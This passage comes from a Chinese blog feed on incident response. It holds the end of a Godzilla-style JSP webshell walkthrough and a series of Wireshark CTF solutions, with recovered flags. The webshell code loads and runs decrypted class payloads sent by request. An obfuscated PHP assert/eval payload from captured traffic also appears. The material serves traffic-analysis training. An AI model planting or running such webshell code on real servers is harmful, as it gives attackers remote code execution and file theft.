&#123;&#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> value;</span><br><span class="line">&#125; </span><br><span class="line">%&gt; </span><br><span class="line">    &lt;%</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="comment">// 解密接收到的数据</span></span><br><span class="line">    <span class="type">byte</span>[] data = base64Decode(request.getParameter(pass));</span><br><span class="line">data = x(data, <span class="literal">false</span>);</span><br><span class="line"><span class="comment">// 判断Payload是否存在,存在则执行</span></span><br><span class="line"><span class="keyword">if</span> (session.getAttribute(<span class="string">&quot;payload&quot;</span>) == <span class="literal">null</span>) &#123;</span><br><span class="line">    session.setAttribute(<span class="string">&quot;payload&quot;</span>, <span class="keyword">new</span> <span class="title class_">X</span>(<span class="built_in">this</span>.getClass().getClassLoader()).Q(data));</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    request.setAttribute(<span class="string">&quot;parameters&quot;</span>, data);</span><br><span class="line">    java.io.<span class="type">ByteArrayOutputStream</span> <span class="variable">arrOut</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">java</span>.io.ByteArrayOutputStream();</span><br><span class="line">    <span class="type">Object</span> <span class="variable">f</span> <span class="operator">=</span> ((Class) session.getAttribute(<span class="string">&quot;payload&quot;</span>)).newInstance();</span><br><span class="line">    f.equals(arrOut);</span><br><span class="line">    f.equals(pageContext);</span><br><span class="line">    <span class="comment">// 截取md5加密后的前16位,并写入到response中</span></span><br><span class="line">    response.getWriter().write(md5.substring(<span class="number">0</span>, <span class="number">16</span>));</span><br><span class="line">    f.toString();</span><br><span class="line">    response.getWriter().write(base64Encode(x(arrOut.toByteArray(), <span class="literal">true</span>)));</span><br><span class="line">    response.getWriter().write(md5.substring(<span class="number">16</span>));</span><br><span class="line">&#125;</span><br><span class="line">&#125; <span class="keyword">catch</span> (Exception e) &#123;&#125; </span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><p>通过 抓包可以得到以下流量,可以发现其实和PHP的差不多,jsp还有一个强特征,那就是测试的这三条数据的大小为<strong>长长短</strong></p><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202211020752860.png" data-fancybox="true"/></div></div><p>我们进入shell之后，随便抓取一条流量就可以拿到任意一个哥斯拉解密软件中,即可解密,如图:</p><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202211021935076.png" data-fancybox="true"/></div></div>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;&#92;assets&#92;css&#92;APlayer.min.css&quot;&gt;&lt;script src=&quot;&#92;assets&#92;js&#92;APlayer.min.js&quot; cla</summary>
      
    
    
    
    
    <category term="应急响应" scheme="https://jiangjiyue.github.io/tags/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/"/>
    
    <category term="流量分析" scheme="https://jiangjiyue.github.io/tags/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/"/>
    
  </entry>
  
  <entry>
    <title>应急响应之Wireshark流量分析</title>
    <link href="https://jiangjiyue.github.io/2024/07/04/dd58c5ed/"/>
    <id>https://jiangjiyue.github.io/2024/07/04/dd58c5ed/</id>
    <published>2024-07-04T10:34:49.000Z</published>
    <updated>2024-10-17T02:14:24.000Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><div class="tag-plugin grid" bg="card" style="grid-template-columns: repeat(auto-fill, minmax(350px, 1fr));"><div class="cell" style="">    <p>总字符数: 24.33K </p>    </div>    <div class="cell" style="">    <p>代码: 7.43K, 文本: 4.96K</p>    </div>    <div class="cell" style="">    <p>预计阅读时间: 54 分钟</p>    </div>    </div>    <div class="tag-plugin video" style="aspect-ratio:1.7777777777777777;max-width:100%;">    <iframe src="https://player.bilibili.com/player.html?bvid=BV15R2UYWED2&autoplay=false" scrolling="no" border="0" frameborder="no" framespacing="0" allowfullscreen="true">    </iframe>    </div>        <div class="tag-plugin video" style="aspect-ratio:1.7777777777777777;max-width:100%;">    <iframe src="https://player.bilibili.com/player.html?bvid=BV16amNYVE22&autoplay=false" scrolling="no" border="0" frameborder="no" framespacing="0" allowfullscreen="true">    </iframe>    </div>    <h2 id="Wireshark基本使用"><a href="#Wireshark基本使用" class="headerlink" title="Wireshark基本使用"></a>Wireshark基本使用</h2><div class="tag-plugin link dis-select"><a class="link-card rich" title="" href="https://www.cnblogs.com/zichliang/p/17477251.html" target="_blank" rel="external nofollow noopener noreferrer" cardlink autofill="title,icon,desc"><div class="top"><div class="lazy img" data-bg="https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.9/link/8f277b4ee0ecd.svg"></div><span class="cap link footnote">https://www.cnblogs.com/zichliang/p/17477251.html</span></div><div class="bottom"><span class="title">https://www.cnblogs.com/zichliang/p/17477251.html</span><span class="cap desc footnote"></span></div></a></div><h2 id="CTF"><a href="#CTF" class="headerlink" title="CTF"></a>CTF</h2><a class="tag-plugin colorful button" color="theme" title="WireShark流量分析" href="https://security-1258894728.cos.ap-beijing.myqcloud.com/EmergencyResponse/wireshark%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90.7z"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" d="M20 12a8 8 0 1 1-16 0a8 8 0 0 1 16 0" opacity=".5"/><path fill="currentColor" d="M17.712 5.453c1.047-.193 2.006-.259 2.797-.152c.77.103 1.536.393 1.956 1.064c.446.714.312 1.542-.012 2.258c-.33.728-.918 1.499-1.672 2.268c-1.516 1.547-3.836 3.226-6.597 4.697c-2.763 1.472-5.495 2.484-7.694 2.92c-1.095.217-2.098.299-2.923.201c-.8-.095-1.6-.383-2.032-1.075c-.47-.752-.296-1.63.07-2.379c.375-.768 1.032-1.586 1.872-2.403L4 12.416c0 .219.083.71.168 1.146c.045.23.09.444.123.596c-.652.666-1.098 1.263-1.339 1.756c-.277.567-.208.825-.145.925c.072.116.305.305.937.38c.609.073 1.44.018 2.455-.183c2.02-.4 4.613-1.351 7.28-2.772c2.667-1.42 4.85-3.015 6.23-4.423c.694-.707 1.15-1.334 1.377-1.836c.233-.515.167-.75.107-.844c-.07-.112-.289-.294-.883-.374c-.542-.072-1.272-.041-2.163.112L16.87 5.656c.338-.101.658-.17.842-.203"/></svg><span>WireShark流量分析</span></a><h3 id="小试牛刀"><a href="#小试牛刀" class="headerlink" title="小试牛刀"></a>小试牛刀</h3><h4 id="扫描流量检测"><a href="#扫描流量检测" class="headerlink" title="扫描流量检测"></a>扫描流量检测</h4><h5 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h5><p>入侵者通过<code>ping</code>工具对局域网内一主机进行存活性扫描,flag 为入侵所发送的<code>16</code>字节的数据包内容。</p><h5 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h5><p>根据提示重点分为两个:</p><ol><li><code>Ping</code>命令的协议为<code>ICMP</code></li><li><code>16</code>字节</li></ol><p>首先,筛选出协议为<code>ICMP</code>的流量包</p><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407231911187.png" data-fancybox="true"/></div></div><p>浏览数据包,发现长度为<code>16</code>自己的数据</p><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407231911177.png" data-fancybox="true"/></div></div><p>将数据进行<code>十六进制</code>转换可得<code>flag</code></p><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407231911656.png" data-fancybox="true"/></div></div><h4 id="提取压缩包"><a href="#提取压缩包" class="headerlink" title="提取压缩包"></a>提取压缩包</h4><h5 id="描述-1"><a href="#描述-1" class="headerlink" title="描述"></a>描述</h5><p><code>key</code>为文本格式，你找得到吗？</p><h5 id="题解-1"><a href="#题解-1" class="headerlink" title="题解"></a>题解</h5><p>右键–&gt;追踪流–&gt;<code>TCP流</code>可看到更详细的信息</p><p>第一个包去请求了一个密钥相关的<code>txt</code>,响应包中告诉我们密钥为<code>ZipYourMouth</code></p><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407231911276.png" data-fancybox="true"/></div></div><p>接着看下一个流量包,发现他去下载了一个<code>flag.zip</code>的压缩包,也就是响应体是压缩包的数据我们只需要将响应体恢复成文件之后即可解压</p><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407231911715.png" data-fancybox="true"/></div></div><p>选择对方给我方的响应对话,并且选择原始数据</p><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407231911256.png" data-fancybox="true"/></div></div><p>然后点击另存为,文件名为<code>flag.zip</code>请求包里是什么名字我们就暂定为什么名字</p><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407231911075.png" data-fancybox="true"/></div></div><p>发现压缩包无效,这是因为我们在保存的时候也把响应头等信息也给保存进去了,我们使用<code>010Editor</code>等工具.将多余的信息删掉即可</p><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407231911461.png" data-fancybox="true"/></div></div><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407231911887.png" data-fancybox="true"/></div></div><p>将其删掉,再次尝试打开.</p><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407231911988.png" data-fancybox="true"/></div></div><p>发现非压缩包.然后我们使用<code>WinRAR</code>尝试修复</p><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407231911385.png" data-fancybox="true"/></div></div><p>打开修复后的压缩包发现显示密码错误,并且压缩包内的文件也不正常</p><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407231911285.png" data-fancybox="true"/></div></div><p>这个时候我们可以直接将<code>pcap</code>包复制一份改名为<code>.zip</code>然后使用<code>WinRAR</code>修复即可</p><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407231912279.png" data-fancybox="true"/></div></div><p>文件名也正确,输入密码得到<code>Flag</code></p><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407231912722.png" data-fancybox="true"/></div></div><h4 id="关键字符提取"><a href="#关键字符提取" class="headerlink" title="关键字符提取"></a>关键字符提取</h4><h5 id="描述-2"><a href="#描述-2" class="headerlink" title="描述"></a>描述</h5><p>请找到流量包中的<code>flag</code>,格式为:<code>nctf&#123;&#125;</code></p><h5 id="题解-2"><a href="#题解-2" class="headerlink" title="题解"></a>题解</h5><p>随便选中一个数据流,按<code>Ctrl+F</code>,选择分组详情,搜索字符串:<code>nctf</code>可得<code>flag</code></p><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407231912195.png" data-fancybox="true"/></div></div><h4 id="特殊字符提取"><a href="#特殊字符提取" class="headerlink" title="特殊字符提取"></a>特殊字符提取</h4><h5 id="描述-3"><a href="#描述-3" class="headerlink" title="描述"></a>描述</h5><p>请找到密码,组合为<code>flag</code>,格式为:<code>flag&#123;密码&#125;</code></p><p>全是<code>TCP</code>协议,直接右键追踪<code>TCP</code>流</p><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407231912097.png" data-fancybox="true"/></div></div><p>上来就发现了密码~好简单啊,并且就这一个包,然后提交<code>flag</code>发现不对.看特征是<code>Linux</code>输入密码.那有没有可能中间有密码输错了,然后<code>Delete</code>键的流量也被记录了.</p><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407231912660.png" data-fancybox="true"/></div></div><p>选择<code>HEX 转储</code></p><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407231912724.png" data-fancybox="true"/></div></div><p>然后对照十六进制的<code>Ascii</code>码表,发现72对应的值确实是<code>r</code>也就是说这些确实是<code>ascii</code>码</p><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407231912970.png" data-fancybox="true"/></div></div><p>找到<code>7f</code>为<code>delete</code>,<code>0D</code>为回车.在<code>r</code>后面按了三下<code>delete</code>,<code>8</code>后面一下,<code>e</code>后面一下回车也就是:<code>backdoorm8te</code></p><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407231912673.png" data-fancybox="true"/></div></div><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407231921446.png" data-fancybox="true"/></div></div><h3 id="文件提取"><a href="#文件提取" class="headerlink" title="文件提取"></a>文件提取</h3><h4 id="ISG-pcap"><a href="#ISG-pcap" class="headerlink" title="ISG.pcap"></a>ISG.pcap</h4><p>直接追踪<code>TCP</code>流,发现是一堆<code>Webshell</code>流量,看不懂没关系,我们直接找文件即可,在流三中发现了<code>x.tar.gz</code></p><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407231912125.png" data-fancybox="true"/></div></div><p>那我们按照上面的方法,提取出压缩包,我们发现在响应体中最前面和最后面有<code>-&gt;| |&lt;-</code>那我们可以猜测这类似是一种包裹方式,而且也不属于压缩包的<a href="http://doc.chacuo.net/filehead">头信息</a>,我们使用<code>010Editor</code>工具给他删掉</p><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407231912112.png" data-fancybox="true"/></div></div><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407231912873.png" data-fancybox="true"/></div></div><p>最后就这样</p><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407231912902.png" data-fancybox="true"/></div></div><p>打开压缩包可得<code>flag</code></p><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407231913181.png" data-fancybox="true"/></div></div><h4 id="final-pcap"><a href="#final-pcap" class="headerlink" title="final.pcap"></a>final.pcap</h4><p>打开后可发现<code>ftp</code>协议,直接追踪该流,流1可发现账号密码,保存一下</p><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407231913422.png" data-fancybox="true"/></div></div><p>流2可以发现很明显的<code>Rar</code>头信息,提取出来</p><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407231913916.png" data-fancybox="true"/></div></div><p>发现需要密码,拿流1中的密码去尝试,也解不开</p><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407231913657.png" data-fancybox="true"/></div></div><p>接着往下看流,在流4中发现了<code>PNG</code>头</p><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407231913558.png" data-fancybox="true"/></div></div><p>提取出来,删除多余的数据,然后发现图片打不开,接着往下看流,流5中发现<code>Base64</code>编码的内容</p><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407231913104.png" data-fancybox="true"/></div></div><p>发现普通Base64无法解码,试一下解码为中文</p><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407231913302.png" data-fancybox="true"/></div></div><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407231913907.png" data-fancybox="true"/></div></div><p>解压出来后使用记事本打开<code>66666666666</code>文件发现是一堆乱码,那就用<code>010Editor.exe</code>打开看看</p><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407231913430.png" data-fancybox="true"/></div></div><p>发现了<code>IHDR</code>很熟悉,上面看到过.发现是个<code>PNG</code>图片但是缺少了头信息,那我们随便找一个正常的<code>PNG</code>图片的数据复制过来</p><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407231913900.png" data-fancybox="true"/></div></div><p>复制第一行即可,替换掉</p><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407231913191.png" data-fancybox="true"/></div></div><p>得到<code>flag</code></p><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407231913495.png" data-fancybox="true"/></div></div><h3 id="导出对象"><a href="#导出对象" class="headerlink" title="导出对象"></a>导出对象</h3><h4 id="流量中的线索-pcapng"><a href="#流量中的线索-pcapng" class="headerlink" title="流量中的线索.pcapng"></a>流量中的线索.pcapng</h4><p>选择文件—&gt;导出对象—&gt;<code>HTTP</code></p><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407231913612.png" data-fancybox="true"/></div></div><p>打开发现是一堆<code>Base64</code>数据</p><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407231913762.png" data-fancybox="true"/></div></div><p>使用<code>Base64</code>解码或前方加上<code>data:image/jpg;Base64,</code></p><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407231913464.png" data-fancybox="true"/></div></div><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407231913534.png" data-fancybox="true"/></div></div><h4 id="Misc-我抓到你了"><a href="#Misc-我抓到你了" class="headerlink" title="Misc-我抓到你了"></a>Misc-我抓到你了</h4><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407231913847.png" data-fancybox="true"/></div></div><p>打开<code>1.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">a=<span class="title function_ invoke__">array_map</span>(<span class="string">&quot;ass&quot;</span>.<span class="string">&quot;ert&quot;</span>,<span class="keyword">array</span>(<span class="string">&quot;ev&quot;</span>.<span class="string">&quot;Al(\&quot;\\\$xx%3D\\\&quot;Ba&quot;</span>.<span class="string">&quot;SE6&quot;</span>.<span class="string">&quot;4_dEc&quot;</span>.<span class="string">&quot;OdE\\\&quot;;@ev&quot;</span>.<span class="string">&quot;al(\\\$xx(&#x27;QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpO0BzZXRfdGltZV9saW1pdCgwKTtpZihQSFBfVkVSU0lPTjwnNS4zLjAnKXtAc2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lKDApO307ZWNobygiWEBZIik7JEY9Ii92YXIvd3d3L2ZsYWcuemlwIjskZnA9QGZvcGVuKCRGLCdyJyk7aWYoQGZnZXRjKCRmcCkpe0BmY2xvc2UoJGZwKTtAcmVhZGZpbGUoJEYpO31lbHNle2VjaG8oJ0VSUk9SOi8vIENhbiBOb3QgUmVhZCcpO307ZWNobygiWEBZIik7ZGllKCk7&#x27;));\&quot;);&quot;</span>));</span><br><span class="line"></span><br><span class="line"><span class="comment"># 解析</span></span><br><span class="line"><span class="string">&quot;ass&quot;</span>.<span class="string">&quot;ert&quot;</span>   <span class="comment"># assert</span></span><br><span class="line"><span class="string">&quot;ev&quot;</span>.<span class="string">&quot;AL&quot;</span>     <span class="comment"># eval</span></span><br><span class="line"><span class="variable">$xx</span>%<span class="number">3</span>D        <span class="comment">#  $xx=</span></span><br><span class="line"><span class="string">&quot;Ba&quot;</span>.<span class="string">&quot;SE6&quot;</span>.<span class="string">&quot;4_dEc&quot;</span>.<span class="string">&quot;OdE&quot;</span>   <span class="comment"># Base64_decode</span></span><br></pre></td></tr></table></figure><p>也就是<code>Base64</code>解码,那我们也解码一下</p><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407231913775.png" data-fancybox="true"/></div></div><p>可以发现了<code>flag.zip</code>那我们将响应体保存为<code>zip</code>,并删除多余数据</p><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407231914538.png" data-fancybox="true"/></div></div><h4 id="fly-pcapng"><a href="#fly-pcapng" class="headerlink" title="fly.pcapng"></a>fly.pcapng</h4><p>导出<code>HTTP</code>对象，发现是邮箱的数据传输</p><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407231914126.png" data-fancybox="true"/></div></div><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407231914560.png" data-fancybox="true"/></div></div><p>右键追踪流,往前翻看看是传输的什么文件<code>&#123;&quot;path&quot;:&quot;fly.rar&quot;,&quot;appid&quot;:&quot;&quot;,&quot;size&quot;:525701,&quot;md5&quot;:&quot;e023afa4f6579db5becda8fe7861c2d3&quot;,&quot;sha&quot;:&quot;ecccba7aea1d482684374b22e2e7abad2ba86749&quot;,&quot;sha3&quot;:&quot;&quot;&#125;</code></p><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407231914904.png" data-fancybox="true"/></div></div><p>按照序号将五个数据包的大小记录下来,分别为<code>131436</code>、<code>131436</code>、<code>131436</code>、<code>131436</code>、<code>1777</code>一共是<code>527521Byte</code>,但是上面的大小为<code>525701</code>也就是说每个数据包前面都有固定大小的标识.<code>(527521-525701)/5=364</code>.</p><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407231914124.png" data-fancybox="true"/></div></div><p>去掉每个数据包<code>364 byte</code>的其他头部信息,然后再将5个文件合并成<code>rar</code>压缩文件</p><p>找到数据传输包，选中<code>data</code>的部分右键，导出分组字节流即可</p><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407231914725.png" data-fancybox="true"/></div></div><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/bin]</span><br><span class="line">└─$ <span class="built_in">dd</span> <span class="keyword">if</span>=1.bin bs=1 skip=364 of=1.1</span><br><span class="line">输入了 131072+0 块记录</span><br><span class="line">输出了 131072+0 块记录</span><br><span class="line">131072 字节 (131 kB, 128 KiB) 已复制，0.176974 s，741 kB/s</span><br><span class="line">┌──(kali㉿kali)-[~/bin]</span><br><span class="line">└─$ <span class="built_in">dd</span> <span class="keyword">if</span>=2.bin bs=1 skip=364 of=2.1</span><br><span class="line">输入了 131072+0 块记录</span><br><span class="line">输出了 131072+0 块记录</span><br><span class="line">131072 字节 (131 kB, 128 KiB) 已复制，0.189166 s，693 kB/s</span><br><span class="line">┌──(kali㉿kali)-[~/bin]</span><br><span class="line">└─$ <span class="built_in">dd</span> <span class="keyword">if</span>=3.bin bs=1 skip=364 of=3.1                              </span><br><span class="line">输入了 131072+0 块记录</span><br><span class="line">输出了 131072+0 块记录</span><br><span class="line">131072 字节 (131 kB, 128 KiB) 已复制，0.173329 s，756 kB/s</span><br><span class="line">┌──(kali㉿kali)-[~/bin]</span><br><span class="line">└─$ <span class="built_in">dd</span> <span class="keyword">if</span>=4.bin bs=1 skip=364 of=4.1                              </span><br><span class="line">输入了 131072+0 块记录</span><br><span class="line">输出了 131072+0 块记录</span><br><span class="line">131072 字节 (131 kB, 128 KiB) 已复制，0.182208 s，719 kB/s</span><br><span class="line">┌──(kali㉿kali)-[~/bin]</span><br><span class="line">└─$ <span class="built_in">dd</span> <span class="keyword">if</span>=5.bin bs=1 skip=364 of=5.1                              </span><br><span class="line">输入了 1413+0 块记录</span><br><span class="line">输出了 1413+0 块记录</span><br><span class="line">1413 字节 (1.4 kB, 1.4 KiB) 已复制，0.00178347 s，792 kB/s</span><br><span class="line">┌──(kali㉿kali)-[~/bin]</span><br><span class="line">└─$ <span class="built_in">ls</span></span><br><span class="line">1.1  1.bin  2.1  2.bin  3.1  3.bin  4.1  4.bin  5.1  5.bin </span><br><span class="line">┌──(kali㉿kali)-[~/bin]                                                           </span><br><span class="line">└─$ <span class="built_in">cat</span> *.1 &gt; flay.rar                                                      </span><br><span class="line">┌──(kali㉿kali)-[~/bin]                                                                   </span><br><span class="line">└─$ <span class="built_in">md5sum</span> flay.rar </span><br><span class="line">e023afa4f6579db5becda8fe7861c2d3  flay.rar  </span><br></pre></td></tr></table></figure><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407231914066.png" data-fancybox="true"/></div></div><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/bin]</span><br><span class="line">└─$ unrar x flay.rar </span><br><span class="line"></span><br><span class="line">UNRAR 7.00 beta 4 freeware      Copyright (c) 1993-2024 Alexander Roshal</span><br><span class="line"></span><br><span class="line">flag.txt - the file header is corrupt</span><br><span class="line"></span><br><span class="line">Extracting from flay.rar</span><br><span class="line"></span><br><span class="line">flag.txt - the file header is corrupt</span><br><span class="line">Enter password (will not be echoed) <span class="keyword">for</span> flag.txt: </span><br></pre></td></tr></table></figure><p>可能是个伪加密,<a href="https://blog.csdn.net/woo233/article/details/126734658">搜索rar伪加密改文件头信息解开</a>。</p><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407231914488.png" data-fancybox="true"/></div></div><p>将<code>84</code>替换为<code>80</code></p><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407231914933.png" data-fancybox="true"/></div></div><p>打开后发现是一堆乱码</p><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407231914357.png" data-fancybox="true"/></div></div><p>使用<code>binwalk</code>分析</p><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407231914428.png" data-fancybox="true"/></div></div><p>发现一堆图片使用<code>foremost -T flag.txt </code>进行分离</p><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407231914302.png" data-fancybox="true"/></div></div><p>扫码可得<code>flag</code></p><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407231914445.png" data-fancybox="true"/></div></div><h4 id="Flag"><a href="#Flag" class="headerlink" title="Flag"></a>Flag</h4><ol><li><code>flag&#123;!&quot;#$%&amp;&#39;()*+,-./0&#125;</code></li><li><code>flag&#123;qscet5234diQ&#125;</code></li><li><code>nctf&#123;wireshark_is_easy&#125;</code></li><li><code>psw flag&#123;backdoorm8te&#125;</code></li><li><code>ISG&#123;China_Ch0pper_Is_A_Slick_Little_Webshe11&#125;</code></li><li><code>flag&#123;FI@G_1$_h#Re_SeC()Ri7Y&#125;</code></li><li><code>flag&#123;209acebf6324a09671abc31c869de72c&#125;</code></li><li><code>flag&#123;a264c8ce70dfbc08dcfb9d552e15411a&#125;</code></li><li><code>flag&#123;m1Sc_oxO2_Fly&#125;</code></li></ol><h2 id="流量分析"><a href="#流量分析" class="headerlink" title="流量分析"></a>流量分析</h2><ol><li>某公司内网网络被黑客渗透，请分析流量，给出黑客使用的扫描器 <psw>awvs</psw></li><li>某公司内网网络被黑客渗透，请分析流量，得到黑客扫描到的登陆后台是(相对路径即可) <psw>/admin/login.php?rec=login.php</psw></li><li>某公司内网网络被黑客渗透，请分析流量，得到黑客使用了什么账号密码登陆了web后台(形式:username&#x2F;password) 